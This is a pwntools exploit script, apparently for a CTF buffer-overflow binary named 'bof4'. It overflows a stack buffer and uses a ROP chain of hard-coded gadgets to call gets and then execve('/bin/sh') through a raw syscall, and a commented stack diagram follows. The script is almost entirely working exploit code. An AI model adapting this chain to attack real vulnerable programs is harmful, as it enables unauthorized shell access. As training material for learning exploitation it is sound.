from pwn import *

i = process('./bof4')
elf = context.binary = ELF('./bof4', checksec=False)

gdb.attach(i, gdbscript="catch syscall execve\nc")
input()

padding = 88
pop_rdi = p64(0x000000000040220e) # pop rdi ; ret
pop_rsi = p64(0x00000000004015ae) # pop rsi ; ret
pop_rdx = p64(0x00000000004043e4) # pop rdx ; add rsp, 0x28 ; ret
pop_rax = p64(0x0000000000401001) # pop rax ; ret
syscall = p64(0x000000000040132e)
rw_section = p64(0x406c10) 

payload = flat(
    
    b'A' * padding,
    pop_rdi,    # rdi <- rw_section
    rw_section,  
    p64(elf.sym.gets),    
    pop_rdi,   # rdi <- "/bin/sh"
    rw_section,
    pop_rsi, # rsi <- 0  NULL
    p64(0),
    pop_rdx, # rdx <- 0  NULL
    p64(0),
    b'A'*0x28,
    pop_rax,
    p64(59),    # rax     rdi      rsi    rdx
    syscall     #execve("/bin/sh", NULL, NULL)
)

i.sendlineafter(b": ",payload)
i.sendline(b"/bin/sh")  

i.interactive()

'''       
          
     
+----------------+  
| syscall        |
+----------------+  
| 0x59           |
+----------------+  
| pop_rax        |
+----------------+  
| 'a' * 0x28     |
+----------------+  
| p64(0)         |
+----------------+  
| pop_rdx        |
+----------------+  
| p64(0)         |
+----------------+  
| pop_rsi        |
+----------------+  
| rw_section     |
+----------------+  
| pop_rdi_address|
+----------------+  
| elf.sym.gets   |
+----------------+ 
| rw_section     |  
+----------------+
| Return Addr    |  
+----------------+
| Save rbp       |  
+----------------+
| Local variable |  
|                |  
|                |  
|                |  
+----------------+

'''